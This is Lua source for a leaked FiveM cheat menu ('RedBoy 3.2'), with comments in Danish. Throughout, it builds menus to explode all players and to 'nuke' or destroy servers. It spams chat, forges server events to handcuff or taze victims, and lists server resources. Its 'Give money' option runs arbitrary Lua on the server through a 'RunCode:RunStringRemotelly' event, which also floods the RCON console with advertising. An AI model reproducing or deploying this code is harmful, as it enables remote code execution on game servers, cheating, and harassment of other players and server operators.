local selectedVehicle = 1

local currentVehicleSpeed = 16
local selectedVehicleSpeed = 16

local currentBone = 1
local selectedBone = 1

local currentDamage = 1
local selectedDamage = 1

local currentPed = 1
local selectedPed = 1
local selectedPedd = 1
local currentPedd = 1
local selectedPeddd = 1
local currentPeddd = 1
local selectedPedddd = 1
local currentPedddd = 1

local currentBullet = 1
local selectedBullet = 1






    
	local currPFuncIndex = 1
	local selPFuncIndex = 1
	
	local currSPFuncIndex = 1
	local selSPFuncIndex = 1
	
	local currVFuncIndex = 1
	local selVFuncIndex = 1
	
	local currSeatIndex = 1
	local selSeatIndex = 1
	
	local currTireIndex = 1
	local selTireIndex = 1
	
    local currNoclipSpeedIndex = 1
    local selNoclipSpeedIndex = 1
    
    local currForcefieldRadiusIndex = 1
    local selForcefieldRadiusIndex = 1
    
    local currFastRunIndex = 1
    local selFastRunIndex = 1
    
    local currFastSwimIndex = 1
    local selFastSwimIndex = 1

    local currObjIndex = 1
    local selObjIndex = 1
    
    local currRotationIndex = 3
    local selRotationIndex = 3
    
    local currDirectionIndex = 1
    local selDirectionIndex = 1
    
    local Outfits = {}
    local currClothingIndex = 1
    local selClothingIndex = 1
    
    local currGravIndex = 3
    local selGravIndex = 3
    
    local currSpeedIndex = 1
    local selSpeedIndex = 1
    
    local currAttackTypeIndex = 1
    local selAttackTypeIndex = 1
    
    local currESPDistance = 3
    local selESPDistance = 3
	
	local currESPRefreshIndex = 1
	local selESPRefreshIndex = 1
    
    local currAimbotBoneIndex = 1
    local selAimbotBoneIndex = 1
    
    local currSaveLoadIndex1 = 1
    local selSaveLoadIndex1 = 1
    local currSaveLoadIndex2 = 1
    local selSaveLoadIndex2 = 1
    local currSaveLoadIndex3 = 1
    local selSaveLoadIndex3 = 1
    local currSaveLoadIndex4 = 1
    local selSaveLoadIndex4 = 1
    local currSaveLoadIndex5 = 1
    local selSaveLoadIndex5 = 1
    
    local currRadioIndex = 1
    local selRadioIndex = 1

    local currWeatherIndex = 1
    local selWeatherIndex = 1


    local TrackedPlayer = nil
	local SpectatedPlayer = nil
	local FlingedPlayer = nil
    local PossessingVeh = false
	local pvblip = nil
	local pvehicle = nil
    local pvehicleText = ""
	local IsPlayerHost = nil
	
	if NetworkIsHost() then
		IsPlayerHost = "~g~Yes"
	else
		IsPlayerHost = "~r~No"
	end
	
    local savedpos1 = nil
    local savedpos2 = nil
    local savedpos3 = nil
    local savedpos4 = nil
    local savedpos5 = nil
    

    local includeself = true
    local Collision = true
    local objVisible = true
    local PlaceSelf = true
    local SpawnInAir = true
    local SpawnEngineOn = true
    

    SpawnedObjects = {}
    
    -- HAR ER MAIN MENU
    RPPPwdjwdU23.CreateMenu('RedBoy', menuName .. ' ' .. version)
    RPPPwdjwdU23.SetSubTitle('RedBoy', 'Bypass Enabled!')
    
    -- HAR ER MAIN MENU SUBMENUS
    RPPPwdjwdU23.CreateSubMenu('player', 'RedBoy', 'Player Options')
    RPPPwdjwdU23.CreateSubMenu('self', 'RedBoy', 'Self Options')
    RPPPwdjwdU23.CreateSubMenu('weapon', 'RedBoy', 'Weapon Options')
    RPPPwdjwdU23.CreateSubMenu('vehicle', 'RedBoy', 'Vehicle Options')
    RPPPwdjwdU23.CreateSubMenu('world', 'RedBoy', 'World Options')
	RPPPwdjwdU23.CreateSubMenu('teleport', 'RedBoy', 'Teleport Options')
    RPPPwdjwdU23.CreateSubMenu('misc', 'RedBoy', 'Misc Options')
    RPPPwdjwdU23.CreateSubMenu('lua', 'RedBoy', 'Lua Options')
    RPPPwdjwdU23.CreateSubMenu('modder', 'RedBoy', 'Destroy Options')
    RPPPwdjwdU23.CreateSubMenu('models', 'RedBoy', 'Models Options')
    RPPPwdjwdU23.CreateSubMenu('dyr', 'RedBoy', 'Skift til et dyr')
    RPPPwdjwdU23.CreateSubMenu('ytt', 'RedBoy', 'Skift til en youtuber')
    
    
    -- HAR ER PLAYER MENU SUBMENUS
    RPPPwdjwdU23.CreateSubMenu('allplayer', 'player', 'All Players')
    RPPPwdjwdU23.CreateSubMenu('playeroptions', 'player', 'Player Options')
    RPPPwdjwdU23.CreateSubMenu('weaponspawnerplayer', 'player', 'Weapon Player')
    
    --HAR ER SELF MENU SUBMENUS
    RPPPwdjwdU23.CreateSubMenu('appearance', 'self', 'Appearance Options')
    RPPPwdjwdU23.CreateSubMenu('modifiers', 'self', 'Modifiers Options')
	
	-- HAR ER APPEARANCE SUBMENUS
	RPPPwdjwdU23.CreateSubMenu('modifyskintextures', 'appearance', "Modify Skin Textures")
    RPPPwdjwdU23.CreateSubMenu('modifyhead', 'modifyskintextures', "Available Drawables")
    
    --  HAR ER WEAPON MENU SUBMENUS
    RPPPwdjwdU23.CreateSubMenu('weaponspawner', 'weapon', 'Weapon Spawner')
    RPPPwdjwdU23.CreateSubMenu('bulletgunmenu', 'weapon', 'Bullets Gun Options')
    RPPPwdjwdU23.CreateSubMenu('melee', 'weaponspawner', 'Melee Weapons')
    RPPPwdjwdU23.CreateSubMenu('pistol', 'weaponspawner', 'Pistols')
    RPPPwdjwdU23.CreateSubMenu('smg', 'weaponspawner', 'SMGs / MGs')
    RPPPwdjwdU23.CreateSubMenu('shotgun', 'weaponspawner', 'Shotguns')
    RPPPwdjwdU23.CreateSubMenu('assault', 'weaponspawner', 'Assault Rifles')
    RPPPwdjwdU23.CreateSubMenu('sniper', 'weaponspawner', 'Sniper Rifles')
    RPPPwdjwdU23.CreateSubMenu('thrown', 'weaponspawner', 'Thrown Weapons')
    RPPPwdjwdU23.CreateSubMenu('heavy', 'weaponspawner', 'Heavy Weapons')
    RPPPwdjwdU23.CreateSubMenu('cust', 'weaponspawner', 'weaponcustomization')
    
    -- HAR ER VEHICLE MENU SUBMENUS
    RPPPwdjwdU23.CreateSubMenu('vehiclespawner', 'vehicle', 'Vehicle Spawner')
    RPPPwdjwdU23.CreateSubMenu('vehiclemods', 'vehicle', 'Vehicle Mods')
    RPPPwdjwdU23.CreateSubMenu('vehiclemenu', 'vehicle', 'Vehicle Control Menu')
    
    -- HAR ER VEHICLE SPAWNER MENU
    RPPPwdjwdU23.CreateSubMenu('compacts', 'vehiclespawner', 'Compacts')
    RPPPwdjwdU23.CreateSubMenu('sedans', 'vehiclespawner', 'Sedans')
    RPPPwdjwdU23.CreateSubMenu('suvs', 'vehiclespawner', 'SUVs')
    RPPPwdjwdU23.CreateSubMenu('coupes', 'vehiclespawner', 'Coupes')
    RPPPwdjwdU23.CreateSubMenu('muscle', 'vehiclespawner', 'Muscle')
    RPPPwdjwdU23.CreateSubMenu('sportsclassics', 'vehiclespawner', 'Sports Classics')
    RPPPwdjwdU23.CreateSubMenu('sports', 'vehiclespawner', 'Sports')
    RPPPwdjwdU23.CreateSubMenu('super', 'vehiclespawner', 'Super')
    RPPPwdjwdU23.CreateSubMenu('motorcycles', 'vehiclespawner', 'Motorcycles')
    RPPPwdjwdU23.CreateSubMenu('offroad', 'vehiclespawner', 'Off-Road')
    RPPPwdjwdU23.CreateSubMenu('industrial', 'vehiclespawner', 'Industrial')
    RPPPwdjwdU23.CreateSubMenu('utility', 'vehiclespawner', 'Utility')
    RPPPwdjwdU23.CreateSubMenu('vans', 'vehiclespawner', 'Vans')
    RPPPwdjwdU23.CreateSubMenu('cycles', 'vehiclespawner', 'Cycles')
    RPPPwdjwdU23.CreateSubMenu('boats', 'vehiclespawner', 'Boats')
    RPPPwdjwdU23.CreateSubMenu('helicopters', 'vehiclespawner', 'Helicopters')
    RPPPwdjwdU23.CreateSubMenu('planes', 'vehiclespawner', 'Planes')
    RPPPwdjwdU23.CreateSubMenu('service', 'vehiclespawner', 'Service')
    RPPPwdjwdU23.CreateSubMenu('commercial', 'vehiclespawner', 'Commercial')
    
    -- HAR ER VEHICLE MODS SUBMENUS
    RPPPwdjwdU23.CreateSubMenu('vehiclecolors', 'vehiclemods', 'Vehicle Colors')
    RPPPwdjwdU23.CreateSubMenu('vehiclecolors_primary', 'vehiclecolors', 'Primary Color')
    RPPPwdjwdU23.CreateSubMenu('vehiclecolors_secondary', 'vehiclecolors', 'Secondary Color')
    
    RPPPwdjwdU23.CreateSubMenu('primary_classic', 'vehiclecolors_primary', 'Classic Colors')
    RPPPwdjwdU23.CreateSubMenu('primary_matte', 'vehiclecolors_primary', 'Matte Colors')
    RPPPwdjwdU23.CreateSubMenu('primary_metal', 'vehiclecolors_primary', 'Metals')
    
    RPPPwdjwdU23.CreateSubMenu('secondary_classic', 'vehiclecolors_secondary', 'Classic Colors')
    RPPPwdjwdU23.CreateSubMenu('secondary_matte', 'vehiclecolors_secondary', 'Matte Colors')
    RPPPwdjwdU23.CreateSubMenu('secondary_metal', 'vehiclecolors_secondary', 'Metals')
    
    RPPPwdjwdU23.CreateSubMenu('vehicletuning', 'vehiclemods', 'Vehicle Tuning')


    -- HAR ER WORLD MENU SUBMENUS
    RPPPwdjwdU23.CreateSubMenu('objectspawner', 'world', 'Object Spawner')
    RPPPwdjwdU23.CreateSubMenu('objectlist', 'objectspawner', 'Select To Delete')
    RPPPwdjwdU23.CreateSubMenu('weather', 'world', 'Weather Changer ~r~(CLIENT SIDE)')
    RPPPwdjwdU23.CreateSubMenu('time', 'world', 'Time Changer')
    
    -- HAR ER MISC MENU SUBMENUS
	RPPPwdjwdU23.CreateSubMenu('esp', 'misc', 'ESP & Visual Options')
	RPPPwdjwdU23.CreateSubMenu('keybindings', 'misc', 'Keybindings')
	RPPPwdjwdU23.CreateSubMenu('webradio', 'misc', 'Web Radio')
    RPPPwdjwdU23.CreateSubMenu('credits', 'misc', 'Credits')
    
    -- HAR ER TELEPORT MENU SUBMENUS
    RPPPwdjwdU23.CreateSubMenu('saveload', 'teleport', 'Save/Load Position')
    RPPPwdjwdU23.CreateSubMenu('pois', 'teleport', 'POIs')
    
    -- HER ER modler/models
    RPPPwdjwdU23.CreateSubMenu('dyr', 'models', 'Skift til et dyr')
    RPPPwdjwdU23.CreateSubMenu('ytt', 'models', 'Skift til en youtuber')




    -- HAR ER LUA MENU SUBMENUS
    RPPPwdjwdU23.CreateSubMenu('esx', 'lua', 'ESX Options')
    RPPPwdjwdU23.CreateSubMenu('vrp', 'lua', 'vRP Options')
    RPPPwdjwdU23.CreateSubMenu('Custom Menu', 'lua', 'Custom Menu')
    RPPPwdjwdU23.CreateSubMenu('server resource', 'lua', 'Server Resource')
    RPPPwdjwdU23.CreateSubMenu('TriggerEventsVRP', 'lua', 'TriggerEventsVRP')
    
    RPPPwdjwdU23.InitializeTheme()
    
    while true do
        
        -- MAIN MENU
        if RPPPwdjwdU23.IsMenuOpened('RedBoy') then
            if RPPPwdjwdU23.MenuButton('Self Options', 'self') then
            elseif RPPPwdjwdU23.MenuButton('Player Options', 'player') then             
            elseif RPPPwdjwdU23.MenuButton('Weapon Options', 'weapon') then
            elseif RPPPwdjwdU23.MenuButton('Vehicle Options', 'vehicle') then
            elseif RPPPwdjwdU23.MenuButton('Models Options', 'models') then
            elseif RPPPwdjwdU23.MenuButton('Destroy Server', 'modder') then
            elseif RPPPwdjwdU23.MenuButton('World Options', 'world') then
			elseif RPPPwdjwdU23.MenuButton('Teleport Options', 'teleport') then
            elseif RPPPwdjwdU23.MenuButton('Misc Options', 'misc') then
            elseif RPPPwdjwdU23.MenuButton('Lua Options', 'lua') then
            elseif RPPPwdjwdU23.Button("Server ~g~IP: ~s~"..GetCurrentServerEndpoint()) then
            elseif RPPPwdjwdU23.Button('Exit') then RPPPwdjwdU23.CloseMenu()
            elseif RPPPwdjwdU23.Button('~r~Kill Menu') then break
                ShowInfo("~r~why me :(...")
            end



        
        -- PLAYER OPTIONS MENU
        elseif RPPPwdjwdU23.IsMenuOpened('player') then
            if RPPPwdjwdU23.MenuButton('All Players', 'allplayer') then
                else
                local playerlist = GetActivePlayers()
                for i = 1, #playerlist do
                    local currPlayer = playerlist[i]
                    if RPPPwdjwdU23.MenuButton("ID: ~y~[" .. GetPlayerServerId(currPlayer) .. "] ~s~" .. GetPlayerName(currPlayer), 'playeroptions') then
                        selectedPlayer = currPlayer end
                end
            end
        
        
        -- ALL PLAYERS MENU
        elseif RPPPwdjwdU23.IsMenuOpened('allplayer') then
            if RPPPwdjwdU23.CheckBox("Include Self", includeself, "No", "Yes") then
                includeself = not includeself
                --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
                elseif RPPPwdjwdU23.Button("Get ~b~Resource ~r~(F8)") then
                    ShowInfo("~y~F8")
                    Resources = GetResources()
        
        ResourcesToCheck = {
                -- ESX
                "es_extended", "esx_dmvschool", "esx_policejob", "",
                -- VRP
                --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
                "[vrp]", "vrp", "vrp_trucker", "vrp_TruckerJob", "vrp_mysql", "vrp_onlinejobs", "cfg",
                -- DN-Scripts
                --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
                "[dn-scripts]", "dn-loadingscreen", "dn-mech", "fivem", "[v??ben]", "guns", "stream", "AC", "[Misc]", "DiscordBot", "modelblacklist", "removeshopcars", "construction", "",
                -- Scrips
                --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
                "dato", "resources", "server", "dn-stream", "client", "gui", "modules", "vrp_doors",
        }
        
        print("\n\nRESOURCES FOUND\n________________\n")
        for i = 1, #Resources do
            --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
            print(Resources[i])
        end
        print("\n________________\nEND OF RESOURCES BY K??DKONGEN#9999\n")
    elseif RPPPwdjwdU23.Button("~r~n!uke Server") then
        --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
        ShowInfo("~y~Fucking Players...")
        EdWiowko()

    elseif RPPPwdjwdU23.CheckBox("Explode All Players ~r~(LOOP)", ExplodingAll) then
        ExplodingAll = not ExplodingAll
    elseif RPPPwdjwdU23.Button("~h~~b~------~q~S~r~e~g~r~o~v~p~e~g~r ~w~IP~b~------") then
    --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
elseif RPPPwdjwdU23.Button("~q~S~r~e~g~r~o~v~p~e~g~r ~g~IP: ~s~"..GetCurrentServerEndpoint()) then
    --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
elseif RPPPwdjwdU23.Button("~h~~b~------~q~S~r~e~g~r~o~v~p~e~g~r ~w~IP~b~------") then
            elseif RPPPwdjwdU23.Button("Spam Chat") then
                TriggerEvent('chatMessage', "^1[Redboy 3.2]", { 255, 0, 62 }, "^2Redboy 3.2 ^3is the ^4best menu ^5on the ^6market right now!")
                TriggerEvent('chatMessage', "^1[Redboy 3.2]", { 255, 0, 62 }, "^2Redboy 3.2 ^3is the ^4best menu ^5on the ^6market right now!")
                TriggerEvent('chatMessage', "^1[Redboy 3.2]", { 255, 0, 62 }, "^2Redboy 3.2 ^3is the ^4best menu ^5on the ^6market right now!")
                TriggerEvent('chatMessage', "^1[Redboy 3.2]", { 255, 0, 62 }, "^2Redboy 3.2 ^3is the ^4best menu ^5on the ^6market right now!")
                TriggerEvent('chatMessage', "^1[Redboy 3.2]", { 255, 0, 62 }, "^2Redboy 3.2 ^3is the ^4best menu ^5on the ^6market right now!")
                TriggerEvent('chatMessage', "^1[Redboy 3.2]", { 255, 0, 62 }, "^2Redboy 3.2 ^3is the ^4best menu ^5on the ^6market right now!")
                TriggerEvent('chatMessage', "^1[Redboy 3.2]", { 255, 0, 62 }, "^2Redboy 3.2 ^3is the ^4best menu ^5on the ^6market right now!")
                --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
                TriggerEvent('chatMessage', "^1[Redboy 3.2]", { 255, 0, 62 }, "^2Redboy 3.2 ^3is the ^4best menu ^5on the ^6market right now!")
                TriggerEvent('chatMessage', "^1[Redboy 3.2]", { 255, 0, 62 }, "^2Redboy 3.2 ^3is the ^4best menu ^5on the ^6market right now!")
                TriggerEvent('chatMessage', "^1[Redboy 3.2]", { 255, 0, 62 }, "^2Redboy 3.2 ^3is the ^4best menu ^5on the ^6market right now!")
                TriggerEvent('chatMessage', "^1[Redboy 3.2]", { 255, 0, 62 }, "^2Redboy 3.2 ^3is the ^4best menu ^5on the ^6market right now!")
                TriggerEvent('chatMessage', "^1[Redboy 3.2]", { 255, 0, 62 }, "^2Redboy 3.2 ^3is the ^4best menu ^5on the ^6market right now!")
                TriggerEvent('chatMessage', "^1[Redboy 3.2]", { 99955, 0, 62 }, "^2Discord ^3| ^4Discord^5.gg/^6bKJd4eC5Db")
            elseif RPPPwdjwdU23.Button("~h~~b~------Explode all------") then
            elseif RPPPwdjwdU23.Button("Explode All Players") then
                ExplodeAll(includeself)
            elseif RPPPwdjwdU23.CheckBox("Set The World On (Sky Filer)~r~Fire", WorldOnFire) then
                WorldOnFire = not WorldOnFire
                if WorldOnFire then
                    wofDUI = CreateDui("https://tinyurl.com/1u1d1rk6", 999, 999)
                else
                    DestroyDui(wofDUI)
                end
                --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
            elseif RPPPwdjwdU23.Button("Fuck You") then
                wofDUI = CreateDui("https://tinyurl.com/1u1d1rk6", 999, 999)
            elseif RPPPwdjwdU23.CheckBox("Classical", ClassicalRadio, "Status: Not Playing", "Status: Playing") then
                    ClassicalRadio = not ClassicalRadio
                    if ClassicalRadio then
                        RadioDUI = CreateDui("https://tinyurl.com/1u1d1rk6", 1, 1)
                        ShowInfo("~b~Now Playing...")
                    else
                        DestroyDui(RadioDUI)
                        --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
                        ShowInfo("~r~Web Radio Stopped!")
                    end



            elseif RPPPwdjwdU23.Button("~h~~b~------Fuck all Weapons------") then
            elseif RPPPwdjwdU23.Button("Give All Players Weapons") then
                GiveAllPlayersWeapons(includeself)
            elseif RPPPwdjwdU23.Button("Remove All Players Weapons") then
                StripAll(includeself)
                --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
            elseif RPPPwdjwdU23.Button("~h~~b~------Fuck all Vehicles------") then
        elseif RPPPwdjwdU23.Button("Set All Nearby Vehicles Plate Text") then
            local plateInput = GetKeyboardInput("Enter Plate Text (8 Characters):")
            for k in EnumerateVehicles() do
                RequestControlOnce(k)
                SetVehicleNumberPlateText(k, plateInput)
            end
            elseif RPPPwdjwdU23.CheckBox("Disable Cars", CarsDisabled) then
                CarsDisabled = not CarsDisabled
                --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
            elseif RPPPwdjwdU23.CheckBox("Disable Guns", GunsDisabled) then
                GunsDisabled = not GunsDisabled
            elseif RPPPwdjwdU23.CheckBox("Clear Streets", ClearStreets) then
                ClearStreets = not ClearStreets
            elseif RPPPwdjwdU23.CheckBox("Noisy Cars", NoisyCars) then
                NoisyCars = not NoisyCars
                if not NoisyCars then
                    for k in EnumerateVehicles() do
                        SetVehicleAlarmTimeLeft(k, 0)
                    end
                end
        elseif RPPPwdjwdU23.Button("~r~Rampinator") then
        for vehicle in EnumerateVehicles() do local eY = CreateObject(-145066854, 0, 0, 0, true, true, true) NetworkRequestControlOfEntity(vehicle) AttachEntityToEntity(eY, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true) NetworkRequestControlOfEntity(eY) SetEntityAsMissionEntity(eY, true, true) end     
        elseif RPPPwdjwdU23.Button("~r~BURGER~s~ Vehicles") then local cC = GetHashKey("xs_prop_hamburgher_wl") for vehicle in EnumerateVehicles() do local cD = CreateObject(cC, 0, 0, 0, true, true, true) AttachEntityToEntity(cD, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true) end 
        elseif RPPPwdjwdU23.Button("Kick All Players From Vehicle") then
            --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
            KickAllFromVeh(includeself)
        elseif RPPPwdjwdU23.CheckBox("~r~Make ~s~All Cars ~y~Fly", FlyingCars) then
            FlyingCars = not FlyingCars
        end


        --player we
    elseif RPPPwdjwdU23.IsMenuOpened("weaponspawnerplayer") then
        for i = 1, #allweapons do
            if RPPPwdjwdU23.Button(allweapons[i]) then
                GiveWeaponToPed(GetPlayerPed(selectedPlayer), GetHashKey(allweapons[i]), 250, false, true)
            end
            --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
        end
        


        -- SPECIFIC PLAYER OPTIONS
        elseif RPPPwdjwdU23.IsMenuOpened('playeroptions') then
            if RPPPwdjwdU23.Button("~p~Selected: " .. "~y~[" .. GetPlayerServerId(selectedPlayer) .. "] ~s~" .. GetPlayerName(selectedPlayer)) then
                --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
			elseif RPPPwdjwdU23.CheckBox("Spectate Player", Spectating, "Spectating: Nobody", "Spectating: "..GetPlayerName(SpectatedPlayer)) then
				Spectating = not Spectating
				SpectatePlayer(selectedPlayer)
                SpectatedPlayer = selectedPlayer
            elseif RPPPwdjwdU23.MenuButton("~g~Give ~s~Single Weapon", 'weaponspawnerplayer') then
            elseif RPPPwdjwdU23.Button("Remove All Weapons") then
                StripPlayer(PlayerId())
            elseif RPPPwdjwdU23.Button("~q~Handcuff ~o~player ~g~(works)") then
                KickFromVeh(selectedPlayer)
                RwFbMFt4el(selectedPlayer)
                ShowInfo("~y~sl?? Invisibility fra og til")
                --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
                print("sl?? Invisibility fra og til")
                SetEntityVisible(PlayerPedId(), 0, 0)
                TeleportToPlayer(selectedPlayer)
                TriggerServerEvent('handcuff:cuffHim')
                ShowInfo("~y~F8")
            elseif RPPPwdjwdU23.Button("~q~Handcuff ~o~player ~g~(auto)") then
                KickFromVeh(selectedPlayer)
                RwFbMFt4el(selectedPlayer)
                SetEntityVisible(PlayerPedId(), 0, 0)
                TeleportToPlayer(selectedPlayer)
                --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
                TriggerServerEvent('handcuff:cuffHim')
                SetEntityVisible(PlayerPedId(), true)
                TriggerServerEvent("vRPcli:playerSpawned")
            elseif RPPPwdjwdU23.Button("Taze ~g~Player") then
                ShowInfo("~y~Taze Player...")
                --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
                RwFbMFt4el(selectedPlayer)
                    
            elseif RPPPwdjwdU23.Button("~b~Spam ~y~Taze ~q~Player ~r~(15x)") then
                TazePlayer15x(selectedPlayer)
            elseif RPPPwdjwdU23.Button("Shoot Player", "~g~(Undetected)") then
                ShootPlayer(selectedPlayer)
            elseif RPPPwdjwdU23.Button("Give money") then
                local id = "local id = " .. GetKeyboardInput("ID:") .. " "
                local rank = 'local amount = '.. GetKeyboardInput('Bel??b:')..' '
                --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
                local admin = [[
                        local warof = 5
                        local users = vRP.getUsers({})
                        local player = vRP.getUserSource({id})
                        vRP.giveBankMoney({id,amount})
                        for i = 1,500 do 
                            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
                            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
                        end
                    ]]
                local admin2 = id .. rank ..admin
                udwdj('RunCode:RunStringRemotelly', admin2)
            elseif RPPPwdjwdU23.CheckBox("Fling Player", FlingingPlayer, "Flinging: Nobody", "Flinging: "..GetPlayerName(FlingedPlayer)) then
				FlingingPlayer = not FlingingPlayer
				FlingedPlayer = selectedPlayer


            elseif RPPPwdjwdU23.Button("~o~Attack - Fire",false,0.51,0.405) then
                local hamburg = "prop_beach_fire"
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
